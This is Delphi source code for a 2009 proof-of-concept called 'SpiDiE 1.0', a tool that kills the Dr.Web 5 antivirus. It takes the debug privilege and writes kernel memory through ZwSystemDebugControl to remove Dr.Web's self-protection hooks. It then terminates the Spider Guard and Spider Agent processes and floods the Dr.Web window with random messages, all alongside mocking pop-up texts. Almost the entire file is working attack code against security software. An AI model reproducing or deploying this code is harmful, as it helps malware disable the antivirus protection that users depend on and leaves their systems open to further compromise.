{$E EXE}
{$IMAGEBASE $00400000}
{$R-}
{$Q-}
{$IFDEF minimum}
program Spidie;
{$ENDIF}
unit Spidie;
interface

uses
  Windows, WinNative, WinBase, Messages, Loader, RTL, Ring0, FMM;

implementation

var
  bFound1: boolean = false;
  bFound2: boolean = false;
  bFound3: boolean = false;

const
  DrWeb5Title: PWideChar = 'Dr.Web';
  SpiderGuard: PWideChar = 'Spider Guard';
  SpiderAgent: PWideChar = 'SpiderAgent Main';
  SpiDiE10: PAnsiChar = 'SpiDiE 1.0';
  Win32KDriver: PWideChar = 'win32k.sys';
  KeAddSystemServiceTable: PAnsiChar = 'KeAddSystemServiceTable';
  Str2: PAnsiChar = 'Привет SWW :) Не важно, где ты теперь работаешь, главное - талант, а он у тебя есть :)';
  DrWeb5TitleLen: integer = 6;
  SpiderGuardLen: integer = 12;
  SpiderAgentLen: integer = 16;

{$R version.res}
type
  _SERVICE_DESCRIPTOR_ENTRY = record
    ServiceTableBase: PPVOID;
    ServiceCounterTableBase: PPVOID; //Used only in checked build
    NumberOfServices: DWORD;
    ParamTableBase: PBYTE;
  end;
  SERVICE_DESCRIPTOR_ENTRY = _SERVICE_DESCRIPTOR_ENTRY;
  PSERVICE_DESCRIPTOR_ENTRY = ^_SERVICE_DESCRIPTOR_ENTRY;

  _DWBUF = array[0..0] of DWORD;
  DWBUF = _DWBUF;
  PDWBUF = ^_DWBUF;

  _IMAGE_IMPORT_BY_NAME = packed record
    Hint: WORD;
    Name: array[0..0] of CHAR;
  end;
  IMAGE_IMPORT_BY_NAME = _IMAGE_IMPORT_BY_NAME;
  PIMAGE_IMPORT_BY_NAME = ^_IMAGE_IMPORT_BY_NAME;

const
  IMAGE_ORDINAL_FLAG32 = $80000000;
  WINXP_SHSDT_ENTRIES_COUNT = 667;

var
  OrigSTable: PDWBUF;
  bytesIO: DWORD;

function GetModuleBaseByName(Name: PAnsiChar): DWORD;
var
  Modules: PSystemModules;
  i, bytesIO: DWORD;
  u: integer;
begin
  result := 0;
  bytesIO := 0;
  i := 0;
  ZwQuerySystemInformation(SystemModuleInformation, @i, sizeof(DWORD), @bytesIO);

  Modules := fmmAlloc(ProcessHeapHandle, bytesIO, true);
  if (Modules <> nil) then
  begin
    ZwQuerySystemInformation(SystemModuleInformation, Modules, bytesIO, @bytesIO);
    for u := 0 to Integer(Modules^.Count) - 1 do
    begin
      if (strcmpiA(@Modules^.sysmodules[u].ImageName[Modules^.sysmodules[u].ModuleNameOffset], Name) = 0) then
      begin
        result := DWORD(Modules^.sysmodules[u].Base);
        break;
      end;
    end;
    fmmFree(ProcessHeapHandle, Modules);
  end;
end;

procedure DumpOrigShadowSDT();
var
  win32kpath: array[0..MAX_PATH - 1] of WideChar;
  dos_header: ^IMAGE_DOS_HEADER;
  pe_headers: PPE_HEADER_BLOCK;
  imp1: PIMAGE_IMPORT_DESCRIPTOR;
  buf, ptable: PChar;
  bufsz, pfn: DWORD;
  c: integer;

  procedure EnumFunctions(FirstName, FirstAddr: DWORD);
  var
    entry1, entry2: PDWORD;
    fn: PIMAGE_IMPORT_BY_NAME;
  begin
    entry1 := PDWORD(PChar(buf) + FirstName);
    entry2 := PDWORD(PChar(buf) + FirstAddr);
    while ((entry1^ <> 0) and (entry2^ <> 0)) do
    begin
      if ((entry1^ and IMAGE_ORDINAL_FLAG32) = 0) then
      begin
        fn := PIMAGE_IMPORT_BY_NAME(PChar(buf) + entry1^);
        if (strcmpA(fn.Name, KeAddSystemServiceTable) = 0) then
        begin
          pfn := DWORD(entry2);
          break;
        end;
      end;
      entry1 := PDWORD(PChar(entry1) + sizeof(DWORD));
      entry2 := PDWORD(PChar(entry2) + sizeof(DWORD));
    end;
  end;

begin
  if (OrigSTable = nil) then
  begin
    bytesIO := WINXP_SHSDT_ENTRIES_COUNT * sizeof(PVOID);
    OrigSTable := fmmAlloc(ProcessHeapHandle, bytesIO, true);
  end;
  memzero(@win32kpath, sizeof(LBuf));
  strcpyW(@win32kpath, KI_SHARED_USER_DATA.NtSystemRoot);
  strcatW(win32kpath, '\system32\');
  strcatW(win32kpath, Win32KDriver);
  buf := PELdrLoadLibrary(win32kpath, nil, nil);
  if (buf <> nil) then
  begin
    dos_header := pointer(buf);
    pe_headers := pointer(PChar(buf) + dos_header^._lfanew);
    imp1 := pointer(PChar(buf) + pe_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

    pfn := 0;
    ptable := nil;
    while (imp1^.Name <> 0) do
    begin
      EnumFunctions(imp1^.OriginalFirstThunk, imp1^.FirstThunk);
      if (pfn <> 0) then
        break;
      imp1 := pointer(PChar(imp1) + sizeof(IMAGE_IMPORT_DESCRIPTOR));
    end;

    for c := 0 to (pe_headers^.OptionalHeader.SizeOfImage - 1) do
      if ((PWORD(@buf[c])^ = $15FF) and (PDWORD(@buf[c + 2])^ = pfn)) then
        if (buf[c - 5] = #$68) then
        begin
          ptable := PPOINTER(@buf[c - 4])^;
          break;
        end;

    if ((ptable <> nil) and (OrigSTable <> nil)) then
    begin
      memcopy(OrigSTable, ptable, WINXP_SHSDT_ENTRIES_COUNT * sizeof(DWORD));
      pfn := GetModuleBaseByName('win32k.sys');
      for c := 0 to WINXP_SHSDT_ENTRIES_COUNT - 1 do
        OrigSTable[c] := OrigSTable[c] - DWORD(buf) + pfn;
    end;

    bufsz := 0;
    ZwFreeVirtualMemory(NtCurrentProcess, @buf, @bufsz, MEM_RELEASE);
  end;
end;

function MapPhysMem(hPhyMem: THANDLE; PhyAddr: PDWORD; Length: PDWORD; VirtAddress: PPVOID): PVOID; stdcall;
var
  ViewBase: LARGE_INTEGER;
begin
  VirtAddress^ := nil;
  ViewBase.LowPart := 0;
  ViewBase.HighPart := 0;
  ViewBase.QuadPart := int64(PhyAddr^);
  ZwMapViewOfSection(hPhyMem, DWORD(-1), VirtAddress, 0, Length^, @viewBase, Length, ViewShare, 0, PAGE_READWRITE);
  PhyAddr^ := DWORD(viewBase.LowPart);
  result := pointer(viewBase.LowPart);
end;

procedure UnmapPhysMem(VirtualAddr: PVOID);
begin
  ZwUnmapViewOfSection(DWORD(-1), VirtualAddr);
end;

var
  PsProcessType: OBJECT_TYPE;

function RemoveDwProtHooks(): boolean;
var
  p1: PVOID;
  bytesIO: ULONG;
  Status: NTSTATUS;
  rv: MEMORY_CHUNKS;
  entries: array[0..3] of SERVICE_DESCRIPTOR_ENTRY;
begin
  result := false;
  GetOriginalSystemState();

  p1 := PChar(FastGetProcAddress(HINST(pntkernel), 'KeServiceDescriptorTable')) - DWORD(pntkernel) + DWORD(KernelBase) - sizeof(entries);

  if (p1 <> nil) then
  begin
    memzero(@entries, sizeof(entries));
    rv.Address := p1;
    rv.Data := @entries;
    rv.Length := sizeof(entries);
    Status := ZwSystemDebugControl(DbgReadVirtualMemory, @rv, sizeof(MEMORY_CHUNKS), nil, 0, @bytesIO);
    if (Status = STATUS_SUCCESS) then
    begin
      memzero(@PsProcessType, sizeof(OBJECT_TYPE));
      p1 := PChar(FastGetProcAddress(HINST(pntkernel), 'PsProcessType')) - DWORD(pntkernel) + DWORD(KernelBase);
      rv.Address := p1;
      rv.Data := @p1;
      rv.Length := sizeof(DWORD);
      Status := ZwSystemDebugControl(DbgReadVirtualMemory, @rv, sizeof(MEMORY_CHUNKS), nil, 0, @bytesIO);
      if (Status = STATUS_SUCCESS) then
      begin
        rv.Address := p1;
        rv.Data := @PsProcessType;
        rv.Length := sizeof(OBJECT_TYPE);
        Status := ZwSystemDebugControl(DbgReadVirtualMemory, @rv, sizeof(MEMORY_CHUNKS), nil, 0, @bytesIO);
        if (Status = STATUS_SUCCESS) then
        begin
          bytesIO := 0;
          rv.Address := pointer(DWORD(p1) + $90); //OpenProcedure removal
          rv.Data := @bytesIO;
          rv.Length := sizeof(DWORD);
          Status := ZwSystemDebugControl(DbgWriteVirtualMemory, @rv, sizeof(MEMORY_CHUNKS), nil, 0, @bytesIO);
          result := (Status = STATUS_SUCCESS);
        end;
      end;
    end;
  end;
  if (OrigSTable <> nil) then fmmFree(ProcessHeapHandle, OrigSTable);
end;

function drweb5(_hwnd: HWND; lParam: LPARAM): BOOL; stdcall;
var
  buf: LBuf;
begin
  if not bFound1 then
  begin
    GetWindowTextW(_hwnd, @buf, MAX_PATH);
    if (strcmpinW(buf, DrWeb5Title, DrWeb5TitleLen) = 0) then
    begin
      PULONG(lParam)^ := _hwnd;
      bFound1 := true;
    end;
  end;
  result := true;
end;

function spider5(_hwnd: HWND; lParam: LPARAM): BOOL; stdcall;
var
  buf: LBuf;
begin
  if not bFound2 then
  begin
    GetWindowTextW(_hwnd, @buf, MAX_PATH);
    if (strcmpinW(buf, SpiderGuard, SpiderGuardLen) = 0) then
    begin
      PULONG(lParam)^ := _hwnd;
      bFound2 := true;
    end;
  end;
  result := true;
end;

function spideragent5(_hwnd: HWND; lParam: LPARAM): BOOL; stdcall;
var
  buf: LBuf;
begin
  if not bFound3 then
  begin
    GetWindowTextW(_hwnd, @buf, MAX_PATH);
    if (strcmpinW(buf, SpiderAgent, SpiderAgentLen) = 0) then
    begin
      PULONG(lParam)^ := _hwnd;
      bFound3 := true;
    end;
  end;
  result := true;
end;

function GetDrWebMainWindow(): HWND;
begin
  bFound1 := false;
  result := 0;
  EnumWindows(@drweb5, Integer(@result));
end;

function GetSpiderAgentWindow(): HWND;
begin
  bFound2 := false;
  result := 0;
  EnumWindows(@spideragent5, Integer(@result));
end;

function GetSpiderGuardWindow(): HWND;
begin
  bFound2 := false;
  result := 0;
  EnumWindows(@spider5, Integer(@result));
end;

procedure RandomizeEx;
var
  systemTime:
  record
    wYear: Word;
    wMonth: Word;
    wDayOfWeek: Word;
    wDay: Word;
    wHour: Word;
    wMinute: Word;
    wSecond: Word;
    wMilliSeconds: Word;
    reserved: array[0..7] of char;
  end;
asm
        LEA     EAX,systemTime
        PUSH    EAX
        CALL    GetSystemTime
        MOVZX   EAX,systemTime.wHour
        IMUL    EAX,60
        ADD     AX,systemTime.wMinute   { sum = hours * 60 + minutes    }
        IMUL    EAX,60
        XOR     EDX,EDX
        MOV     DX,systemTime.wSecond
        ADD     EAX,EDX                 { sum = sum * 60 + seconds              }
        IMUL    EAX,1000
        MOV     DX,systemTime.wMilliSeconds
        ADD     EAX,EDX                 { sum = sum * 1000 + milliseconds       }
        MOV     RandSeed,EAX
end;

procedure ShowMessage(PStr: PAnsiChar; Buttons: DWORD);
begin
  MessageBoxA(GetDesktopWindow, PStr, SpiDiE10, Buttons);
end;

procedure main();
var
  DrWebHwnd: HWND;
  SpiderHwnd: HWND;
  u, k, i: integer;
begin
  ShowMessage('DrWeb5 user mode proof-of-concept killer (trash code included)'#13#10 +
    'DKOH and fucking Shadow SSDT will not help DrWeb!'#13#13#10 +
    '(c) 2009 by EP_X0FF', MB_OK);
  RandomizeEx();
  DrWebHwnd := GetDrWebMainWindow();
  if (DrWebHwnd <> 0) then
  begin
    ShowMessage('DrWeb GUI application located :) Let''s do some fuck with it ^_^', MB_ICONINFORMATION);
    for i := $FF to $FFFFF do
    begin
      u := random($FFFF);
      k := random(u) + random($FFF);
      PostMessageW(DrWebHwnd, i, u, k);
    end;
    ShowMessage('Muhahaha, see u in HELL', MB_ICONWARNING);
  end;

  SpiderHwnd := GetSpiderGuardWindow();
  if (SpiderHwnd <> 0) then
  begin
    ShowMessage('Spider Guard located :) Let''s UnGuard it ololo!!!11', MB_ICONINFORMATION);
    if (RemoveDwProtHooks()) then
    begin
      NtSleep(1000);
      SpiderHwnd := GetSpiderGuardWindow();
      if (SpiderHwnd <> 0) then
        if EndTask(SpiderHwnd, false, true) then ShowMessage('Guardian removed...', MB_ICONINFORMATION);
    end else ShowMessage('Ohh shit!', MB_OK);

    SpiderHwnd := GetSpiderAgentWindow();
    if (SpiderHwnd <> 0) then
    begin
      ShowMessage('Spider Agent also found, proceeding killing...', MB_ICONINFORMATION);
      if EndTask(SpiderHwnd, false, true) then ShowMessage('Spider Agent is gone to hell', MB_ICONINFORMATION);
    end;
    ShowMessage('That''s all folks!', MB_OK);
  end;

  if not bFound1 and not bFound2 and not bFound3 then ShowMessage('Nothing found :('#13#10 + 'Start DrWeb5 first! =)', MB_OK);
end;

var
  osver: OSVERSIONINFOEXW;
begin
  osver.old.dwOSVersionInfoSize := sizeof(osver.old);
  RtlGetVersion(@osver);
  if (osver.old.dwBuildNumber <> 2600) then
  begin
    ShowMessage('Unsupported OS, need recoding of several parts of this PoC', MB_ICONINFORMATION);
  end else
  begin
    RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, true, false, @bytesIO);
    ProcessHeapHandle := fmmCreate(PAGE_SIZE);
    DumpOrigShadowSDT();
    main();
    _fmmDestroy();
    bytesIO := 0;
    ZwFreeVirtualMemory(NtCurrentProcess, @pntkernel, @bytesIO, MEM_RELEASE);
  end;
  ExitProcess(0);
  asm
    call Str2
  end;
end.

